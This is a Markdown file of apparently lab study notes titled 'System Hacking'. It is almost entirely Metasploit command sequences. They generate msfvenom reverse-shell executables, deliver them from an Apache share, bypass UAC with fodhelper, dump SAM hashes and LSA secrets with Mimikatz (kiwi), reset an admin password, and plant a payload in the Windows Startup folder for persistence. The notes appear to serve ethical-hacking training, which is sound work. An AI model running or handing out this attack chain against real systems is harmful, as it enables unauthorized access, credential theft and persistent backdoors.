# System Hacking

<details>
<summary> Exploit client-side vulnerabilities and establish a VNC(Virtual Network Computing) session</summary>

```cosole

[parrot]
sudo su
msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 LHOST PIP LPORT 444 -f exe -o /home/attacker/Desktop/Test.exe
mkdir /var/www/html/share
chmod -R 755 /var/www/html/share
chown -R www-data:www-data /var/www/html/share
cp /home/attacker/Desktop/Test.exe /var/www/html/share
service apache2 start

msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST PIP
set LPORT 444
exploit 

[windows]
http://PIP/share
download Test.exe

[parrot]
{Note: If the Meterpreter shell is not automatically connected to the session, type sessions -i 1}
sysinfo
upload /root/PowerSploit/Privesc/PowerUp.ps1 -->uploads the PowerSploit file to the target system’s present working directory.

Note: PowerUp.ps1 is a program that enables a user to perform quick checks against a Windows machine for any privilege escalation opportunities. It utilizes various service
abuse checks, .dll hijacking opportunities, registry checks, etc. to enumerate common elevation methods for a target system.

shell
powershell -ExecutionPolicy Bypass -Command “. .\PowerUp.ps1;Invoke-AllChecks”

Note: Attackers exploit misconfigured services such as unquoted service paths, service object permissions, unattended installs, modifiable registry autoruns and configurations, and other locations to elevate access privileges. After establishing an active session using Metasploit, attackers use tools such as PowerSploit to detect misconfigured services that exist in the target OS.

exploit VNC vulnerability to gain remote access
run vnc

```
</details>

<details>
<summary>Escalate privileges to gather hashdump using Mimikatz</summary>

  ```console
  
        [linux]
		
	sudo su
	msfvenom -p windows/meterpreter/reverse_tcp lhost=[IP] lport=444 -f exe > /home/attacker/Desktop/backdoor.exe
	share with victim machine
	
	msfconsole
	use exploit/multi/handler
	set payload windows/meterpreter/reverse_tcp
	set LHOST [IP]
	set LPORT 444
	run
	
	[windows]
	access run backdoor.exe
	
	[parrot]
	sysinfo
	getuid -> Windows11\Admin

	background
	use exploit/windows/local/bypassuac_fodhelper
	set session 1
	set LHOST [IP]
	set TARGET 0
	exploit
	getsystem -t 1
	getuid   --> NT AUTHORITY\SYSTEM
	load kiwi    -->to load mimikatz.
	help kiwi    -->to view all the kiwi commands.
	lsa_dump_sam   ->to load NTLM Hash of all users.
	lsa_dump_secrets -> Note: LSA secrets are used to manage a system's local security policy, and contain sesnsitive data such as User passwords, IE passwords, service 
	account passwords, SQL 
	passwords etc.
	
	password_change -u Admin -n [NTLM hash of Admin acquired in previous step] -P password
	lsa_dump_sam   --> check the new hash value
	
	[Windows]
	try to login -> u wont be able to but try with modified pwd, u should be able to login to machine

  ```
</details>

<details>
	<summary>Maintain persistence by abusing boot/logon autostart execution</summary>
	
	```console
	[linux]
	sudo su
	cd 
	msfvenom -p windows/meterpreter/reverse_tcp -f exe LHOST=IP LPORT=444 > /home/attacker/Desktop/exploit.exe
	cp /home/attacker/Desktop/exploit.ext /var/www/html/share/   [follow same steps to share folder - mentioned b4]
	service apache2 start
	msfconsole
	use exploit/multi/handler
	set payload windows/meterpreter/reverse_tcp
	set lhost IP
	set lport 444
	run
	
	[windows]
	http://PIP/share
	
	[linux]
	meterpreter session will be opened
	getuid

	try to bypass the user account control setting that is blocking you from gaining unrestricted access to the machine.
	
	background
	use exploit/windows/local/bypassuac_fodhelper
	set session 1
	show options
	set LHOST IP
	set TARGET 0  [0 - Exploit Target ID]
	exploit

	The BypassUAC exploit has successfully bypassed the UAC setting on the **Windows 11** machine.
	
	getsystem -t 1  -> to elevate privileges
	getuid 
	cd “C:\\ProgramData\\Start Menu\\Programs\\Startup”
	pwd
	create payload that needs to be uploaded into the Startup folder of Windows 11 machine.
	
	Second terminal->
	msfvenom -p windows/meterpreter/reverse_tcp lhost=IP lport=8080 -f exe > payload.exe
	
	First Terminal
	upload /home/attacker/payload.exe 
	
	[windows]
	Login to Admin account -> Restart windows machine
	
	[Linux]
	Open another terminal window with root privilages 
	msfconsole
	use exploit/multi/handler
	set payload windows/meterpreter/reverse_tcp
	set lhost [IP]
	set lport 8080
	exploit
	
	[windows]  login to Admin account and restart the machine so that the malicious file that is placed in the startup folder is executed.
	
	[parrot]
	meterpreter session is open [Note: takes little time to open]
	getuid
 	
</details>
